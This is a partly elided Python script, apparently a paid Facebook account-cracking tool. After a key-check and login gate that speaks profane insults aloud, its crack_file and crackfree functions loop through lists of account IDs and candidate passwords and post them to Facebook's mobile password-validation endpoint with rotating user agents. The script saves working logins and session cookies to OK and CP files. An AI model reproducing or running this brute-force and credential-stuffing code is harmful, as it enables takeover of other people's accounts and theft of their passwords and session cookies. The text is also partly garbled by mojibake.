...
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/md.jarif.3720190/')
#------------------[ Tutul-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
attemps = 0
os.system('espeak -a 300 " Ok,  Fuck,  You"')
...
while attemps < 12345677901:
    ...
    if username == '4' and password == '5':
        ...
        os.system('espeak -a 300 " successfully,  login"')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        os.system('espeak -a 300 " Shor,  Khankir,  Phola"')
        attemps += 1
        continue
os.system('clear')
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/bdbadsha/XARIF-XD/blob/main/Xarif-paid').text
    if id in httpCaht:
      print(" \x1b[0m║══[𝟸] YOUR KEY : "+id)
      input(' \033[1;30m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello sir please approve my key'+id);os.system('am start https://wa.me/+8801302686697?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/md.jarif.3720190')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/jarif.txt  Etc...]')
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Jarif-Cp] {idf} â€¢ {pw}')
                ...
                print(f'\r\033[0;92m[Jarif-OkðŸ’š] {idf} â€¢ {pw}\n\033[0;93m[ðŸŒº]= COOKIES â€¢ \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Jarif,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Jarif-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}â€¢{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}â€¢Jarif-Cp] {idf} â€¢ {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' â€¢ '+pw+'\n')
                akun.append(idf+' â€¢ '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}â€¢Jarif-Ok] {idf} â€¢ {pw} ')
                os.system('espeak -a 300 " Ok,  Jarif,  id"')
                open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
                break
